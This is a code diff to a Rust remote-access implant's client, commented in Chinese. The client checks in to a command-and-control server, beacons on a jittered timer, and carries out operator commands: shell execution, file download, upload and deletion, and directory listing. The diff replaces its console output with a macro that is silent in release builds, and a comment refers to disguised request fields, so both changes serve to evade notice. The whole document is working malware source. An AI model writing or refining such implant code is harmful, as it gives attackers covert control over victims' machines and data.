@@ -8,6 +8,17 @@ use std::thread;
 use serde::{Deserialize, Serialize};
 use rand::Rng;
 
+/// 仅在 debug 模式下输出日志
+#[cfg(debug_assertions)]
+macro_rules! debug_log {
+    ($($arg:tt)*) => { println!($($arg)*) };
+}
+
+#[cfg(not(debug_assertions))]
+macro_rules! debug_log {
+    ($($arg:tt)*) => {};
+}
+
 /// 统一请求格式（含伪装字段）
 #[derive(Serialize)]
 struct EncryptedRequest {
@@ -141,19 +152,19 @@ impl Client {
             // 首先尝试上线
             match self.checkin() {
                 Ok(_) => {
-                    println!("[+] Checkin successful, starting beacon loop...");
+                    debug_log!("[+] Checkin successful, starting beacon loop...");
                     
                     // 进入 Beacon 循环
                     if let Err(e) = self.beacon_loop() {
-                        println!("[!] Beacon error: {}", e);
+                        debug_log!("[!] Beacon error: {}", e);
                     }
                 }
                 Err(e) => {
-                    println!("[!] Checkin failed: {}", e);
+                    debug_log!("[!] Checkin failed: {}", e);
                 }
             }
             
-            println!("[*] Waiting {} seconds before retry...", config::RECONNECT_DELAY);
+            debug_log!("[*] Waiting {} seconds before retry...", config::RECONNECT_DELAY);
             thread::sleep(Duration::from_secs(config::RECONNECT_DELAY));
         }
     }
@@ -212,7 +223,7 @@ impl Client {
         let client_info = sysinfo::collect_system_info();
         self.client_id = client_info.id.clone();
         
-        println!("[*] Checking in to {}...", config::get_http_url());
+        debug_log!("[*] Checking in to {}...", config::get_http_url());
         
         let request = C2Request {
             request_type: "checkin".to_string(),
@@ -236,7 +247,7 @@ impl Client {
             match self.fetch_commands() {
                 Ok(commands) => {
                     if !commands.is_empty() {
-                        println!("[*] Received {} commands", commands.len());
+                        debug_log!("[*] Received {} commands", commands.len());
                         
                         // 执行命令并收集响应
                         let responses = self.execute_commands(commands);
@@ -244,13 +255,13 @@ impl Client {
                         // 提交响应
                         if !responses.is_empty() {
                             if let Err(e) = self.submit_results(responses) {
-                                println!("[!] Failed to submit results: {}", e);
+                                debug_log!("[!] Failed to submit results: {}", e);
                             }
                         }
                     }
                 }
                 Err(e) => {
-                    println!("[!] Beacon failed: {}", e);
+                    debug_log!("[!] Beacon failed: {}", e);
                     return Err(e);
                 }
             }
@@ -259,7 +270,7 @@ impl Client {
             let wait_time = self.calculate_wait_with_jitter();
             
             #[cfg(debug_assertions)]
-            println!("[*] Next beacon in {} seconds", wait_time.as_secs());
+            debug_log!("[*] Next beacon in {} seconds", wait_time.as_secs());
             
             thread::sleep(wait_time);
         }
@@ -323,11 +334,11 @@ impl Client {
             
             if let Some(interval) = new_interval {
                 self.beacon_interval = Duration::from_secs(interval);
-                println!("[*] Beacon interval updated to {} seconds", interval);
+                debug_log!("[*] Beacon interval updated to {} seconds", interval);
             }
             
             if should_exit {
-                println!("[!] Received exit command, terminating...");
+                debug_log!("[!] Received exit command, terminating...");
                 std::process::exit(0);
             }
             
@@ -359,7 +370,7 @@ impl Client {
             return Err("Submit results rejected".into());
         }
         
-        println!("[*] Results submitted successfully");
+        debug_log!("[*] Results submitted successfully");
         Ok(())
     }
     
@@ -368,47 +379,47 @@ impl Client {
         let msg = match Message::deserialize(data) {
             Ok(m) => m,
             Err(e) => {
-                println!("[!] Failed to deserialize message: {}", e);
+                debug_log!("[!] Failed to deserialize message: {}", e);
                 return (None, false, None);
             }
         };
         
         match msg {
             Message::ShellExecute(cmd) => {
-                println!("[*] Executing shell command: {}", cmd.command);
+                debug_log!("[*] Executing shell command: {}", cmd.command);
                 let response = handlers::shell::execute_shell_sync(&cmd);
                 (Some(Message::ShellExecuteResponse(response)), false, None)
             }
             Message::Exit => {
-                println!("[!] Received exit command, terminating...");
+                debug_log!("[!] Received exit command, terminating...");
                 (None, true, None)
             }
             Message::SetBeaconInterval(req) => {
-                println!("[*] Received set beacon interval: {} seconds", req.interval_seconds);
+                debug_log!("[*] Received set beacon interval: {} seconds", req.interval_seconds);
                 (None, false, Some(req.interval_seconds))
             }
             Message::GetDirectoryListing(req) => {
-                println!("[*] Getting directory listing: {}", req.path);
+                debug_log!("[*] Getting directory listing: {}", req.path);
                 let response = handlers::files::get_directory_listing(&req);
                 (Some(Message::DirectoryListingResponse(response)), false, None)
             }
             Message::FileDownload(req) => {
-                println!("[*] Downloading file: {}", req.path);
+                debug_log!("[*] Downloading file: {}", req.path);
                 let response = handlers::files::download_file(&req);
                 (Some(Message::FileDownloadResponse(response)), false, None)
             }
             Message::FileUpload(req) => {
-                println!("[*] Uploading file: {}", req.path);
+                debug_log!("[*] Uploading file: {}", req.path);
                 let response = handlers::files::upload_file(&req);
                 (Some(Message::FileUploadResponse(response)), false, None)
             }
             Message::FileDelete(req) => {
-                println!("[*] Deleting file: {}", req.path);
+                debug_log!("[*] Deleting file: {}", req.path);
                 let response = handlers::files::delete_file(&req);
                 (Some(Message::FileDeleteResponse(response)), false, None)
             }
             _ => {
-                println!("[?] Unknown message type");
+                debug_log!("[?] Unknown message type");
                 (None, false, None)
             }
         }
